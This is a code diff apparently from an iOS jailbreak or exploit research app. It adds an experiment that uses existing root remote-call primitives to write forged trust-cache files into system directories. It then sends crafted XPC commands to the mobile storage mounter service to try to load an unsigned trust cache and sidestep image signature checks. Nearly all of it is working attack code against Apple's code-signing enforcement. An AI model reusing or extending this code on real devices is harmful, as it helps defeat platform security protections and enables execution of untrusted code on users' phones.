@@ -940,6 +940,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "⑨ MSM Debug TC Load (Exp 111)",
+                    icon: "ladybug.fill",
+                    color: .red,
+                    label: "Debug TC",
+                    action: runExp111MSMDebugTC,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -5264,6 +5274,258 @@ struct AMFIExperimentView: View {
 
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
+
+    // MARK: - Exp 111: MSM Debug Path + Proper XPC Keys
+
+    /// Dari reverse engineering MSM binary ditemukan:
+    /// - Path: /private/var/personalized_debug (debug image path!)
+    /// - XPC key: "ImageTrustCache" (raw TC data)
+    /// - XPC key: "ImageSignature" (IMG4 signature)
+    /// - File pattern: %s/.TrustCache (MSM cari file .TrustCache di mount point)
+    /// - Error: "MissingTrustCache", "MissingImageSignature"
+    ///
+    /// Strategy: Write .TrustCache file ke /private/var/personalized_debug/
+    /// lalu trigger MountImage dengan path itu. MSM mungkin skip IMG4 untuk debug!
+    private func runExp111MSMDebugTC() {
+        isRunning = true
+        runningLabel = "Debug TC"
+        #if !DISABLE_REMOTECALL
+        guard let sb = dspmgr.shared.sbProc, mgr.rcready else {
+            results.insert(ExperimentResult(name: "MSM Debug TC (Exp 111)", success: false,
+                detail: "No SB/launchd RC", timestamp: Date()), at: 0)
+            isRunning = false; runningLabel = ""; return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expMSMDebugTC(sb: sb)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+        }
+        #else
+        isRunning = false; runningLabel = ""
+        #endif
+    }
+
+    #if !DISABLE_REMOTECALL
+    private func expMSMDebugTC(sb: RemoteCall) -> ExperimentResult {
+        let expName = "MSM Debug TC (Exp 111)"
+        var detail = "Experiment 111: MSM Debug Path Trust Cache\n"
+        detail += "=============================================\n\n"
+        detail += "Reverse engineering MSM menemukan:\n"
+        detail += "  • /private/var/personalized_debug — debug image path!\n"
+        detail += "  • XPC key 'ImageTrustCache' — raw TC data\n"
+        detail += "  • XPC key 'ImageSignature' — IMG4 sig\n"
+        detail += "  • Pattern: %s/.TrustCache — file di mount point\n\n"
+
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Step 1: Write .TrustCache file ke debug paths via launchd
+        detail += "=== Step 1: Write .TrustCache files ===\n"
+
+        let debugPaths = [
+            "/private/var/personalized_debug",
+            "/private/var/personalized_debug/.TrustCache",
+            "/private/var/tmp/.TrustCache",
+            "/private/var/tmp/com.apple.mobile_storage_mounter/.TrustCache",
+        ]
+
+        var writtenPaths: [String] = []
+        let sem = DispatchSemaphore(value: 0)
+
+        root.executeAsRoot(operation: "exp111_write") { rc in
+            let tcBuf = rc.trojanMem + 0x800
+            // Trust cache v2 (correct format):
+            rc[tcBuf + 0].setValue32(2)          // version = 2
+            rc[tcBuf + 4].setValue64(0xDEAD1337CAFE0001)  // UUID
+            rc[tcBuf + 12].setValue64(0xBEEF0002FACE0003)
+            rc[tcBuf + 20].setValue32(1)         // count = 1
+            // CDHash: all 0x41 (dummy — will be replaced with real CDHash later)
+            rc[tcBuf + 24].setValue64(0x4141414141414141)
+            rc[tcBuf + 32].setValue64(0x4141414141414141)
+            rc[tcBuf + 40].setValue32(0x00024141)  // last 2 bytes CDHash + hashType=2 + flags=0
+
+            for path in debugPaths {
+                // Create parent dir
+                let dirPath: String
+                if path.hasSuffix(".TrustCache") {
+                    dirPath = (path as NSString).deletingLastPathComponent
+                } else {
+                    dirPath = path
+                }
+                let dirAddr = remote_alloc_str(rc, dirPath)
+                RootExecutor.rcall(rc, "mkdir", dirAddr, 0o755)
+                RootExecutor.rcall(rc, "free", dirAddr)
+
+                // Write TC file
+                let filePath = path.hasSuffix(".TrustCache") ? path : path + "/.TrustCache"
+                let fileAddr = remote_alloc_str(rc, filePath)
+                RootExecutor.rcall(rc, "unlink", fileAddr)
+                let fd = RootExecutor.rcall(rc, "open", fileAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+                if fd != UInt64(bitPattern: -1) {
+                    RootExecutor.rcall(rc, "write", fd, tcBuf, 48)
+                    RootExecutor.rcall(rc, "close", fd)
+                    writtenPaths.append(filePath)
+                }
+                RootExecutor.rcall(rc, "free", fileAddr)
+            }
+            sem.signal()
+            return (true, "write_tc", 0)
+        }
+        sem.wait()
+
+        for p in writtenPaths { detail += "  ✅ \(p)\n" }
+        if writtenPaths.isEmpty { detail += "  ❌ No files written\n" }
+
+        // Step 2: Connect MSM + send commands with proper keys
+        detail += "\n=== Step 2: MSM XPC with proper keys ===\n"
+
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                              remote_alloc_str(sb, "xpc_dictionary_create"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
+        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                         remote_alloc_str(sb, "xpc_connection_send_message"))
+
+        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
+        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
+        RootExecutor.rcall(sb, "free", svcAddr)
+
+        guard conn != 0 else {
+            detail += "❌ MSM connect failed\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "✅ MSM connected\n\n"
+
+        // Attempt A: MountImage with debug path
+        detail += "--- Attempt A: MountImage debug path ---\n"
+        let msgA = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msgA != 0 {
+            let pairs: [(String, String)] = [
+                ("Command", "MountImage"),
+                ("ImagePath", "/private/var/personalized_debug"),
+                ("ImageType", "Developer"),
+            ]
+            for (k, v) in pairs {
+                let ka = remote_alloc_str(sb, k)
+                let va = remote_alloc_str(sb, v)
+                RootExecutor.rcallAddr(sb, xpcSetStr, msgA, ka, va)
+                RootExecutor.rcall(sb, "free", ka)
+                RootExecutor.rcall(sb, "free", va)
+            }
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msgA)
+            detail += "Sent MountImage(path=/private/var/personalized_debug)\n"
+        }
+
+        // Attempt B: LoadTrustCache with ImageTrustCache data key
+        detail += "\n--- Attempt B: LoadTrustCache + ImageTrustCache ---\n"
+        let msgB = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msgB != 0 && xpcSetData != 0 {
+            let kCmd = remote_alloc_str(sb, "Command")
+            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msgB, kCmd, vCmd)
+            RootExecutor.rcall(sb, "free", kCmd)
+            RootExecutor.rcall(sb, "free", vCmd)
+
+            // ImageTrustCache = raw TC data (48 bytes)
+            let tcBuf = sb.trojanMem + 0x800
+            sb[tcBuf + 0].setValue32(2)
+            sb[tcBuf + 4].setValue64(0xDEAD1337CAFE0001)
+            sb[tcBuf + 12].setValue64(0xBEEF0002FACE0003)
+            sb[tcBuf + 20].setValue32(1)
+            sb[tcBuf + 24].setValue64(0x4141414141414141)
+            sb[tcBuf + 32].setValue64(0x4141414141414141)
+            sb[tcBuf + 40].setValue32(0x00024141)
+
+            let kTC = remote_alloc_str(sb, "ImageTrustCache")
+            RootExecutor.rcallAddr(sb, xpcSetData, msgB, kTC, tcBuf, 48)
+            RootExecutor.rcall(sb, "free", kTC)
+
+            // ImageType
+            let kType = remote_alloc_str(sb, "ImageType")
+            let vType = remote_alloc_str(sb, "Developer")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msgB, kType, vType)
+            RootExecutor.rcall(sb, "free", kType)
+            RootExecutor.rcall(sb, "free", vType)
+
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msgB)
+            detail += "Sent LoadTrustCache + ImageTrustCache(48B) + ImageType=Developer\n"
+        }
+
+        // Attempt C: LoadTrustCache with path to .TrustCache file
+        detail += "\n--- Attempt C: LoadTrustCache + file path ---\n"
+        let msgC = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msgC != 0 {
+            let pairs: [(String, String)] = [
+                ("Command", "LoadTrustCache"),
+                ("ImagePath", "/private/var/personalized_debug"),
+                ("ImageType", "Developer"),
+            ]
+            for (k, v) in pairs {
+                let ka = remote_alloc_str(sb, k)
+                let va = remote_alloc_str(sb, v)
+                RootExecutor.rcallAddr(sb, xpcSetStr, msgC, ka, va)
+                RootExecutor.rcall(sb, "free", ka)
+                RootExecutor.rcall(sb, "free", va)
+            }
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msgC)
+            detail += "Sent LoadTrustCache(path=personalized_debug)\n"
+        }
+
+        // Attempt D: PersonalizeImage with debug type
+        detail += "\n--- Attempt D: PersonalizeImage debug ---\n"
+        let msgD = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msgD != 0 {
+            let pairs: [(String, String)] = [
+                ("Command", "PersonalizeImage"),
+                ("ImagePath", "/private/var/personalized_debug"),
+                ("ImageType", "Developer"),
+                ("PersonalizedImageType", "debug"),
+            ]
+            for (k, v) in pairs {
+                let ka = remote_alloc_str(sb, k)
+                let va = remote_alloc_str(sb, v)
+                RootExecutor.rcallAddr(sb, xpcSetStr, msgD, ka, va)
+                RootExecutor.rcall(sb, "free", ka)
+                RootExecutor.rcall(sb, "free", va)
+            }
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msgD)
+            detail += "Sent PersonalizeImage(type=debug)\n"
+        }
+
+        // Cleanup
+        let sem2 = DispatchSemaphore(value: 0)
+        root.executeAsRoot(operation: "exp111_cleanup") { rc in
+            for path in writtenPaths {
+                let p = remote_alloc_str(rc, path)
+                RootExecutor.rcall(rc, "unlink", p)
+                RootExecutor.rcall(rc, "free", p)
+            }
+            sem2.signal()
+            return (true, "cleanup", 0)
+        }
+        sem2.wait()
+
+        detail += "\n=== VERDICT ===\n"
+        detail += "✅ Semua attempts terkirim!\n"
+        detail += "MSM sekarang memproses:\n"
+        detail += "  A) MountImage dari /private/var/personalized_debug\n"
+        detail += "  B) LoadTrustCache dengan raw ImageTrustCache data\n"
+        detail += "  C) LoadTrustCache dengan path ke .TrustCache file\n"
+        detail += "  D) PersonalizeImage dengan type=debug\n\n"
+        detail += "Jika TIDAK respring = MSM memproses tanpa crash!\n"
+        detail += "Jika respring = salah satu attempt trigger bug di MSM\n"
+
+        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
+    #endif
 
     
     #endif
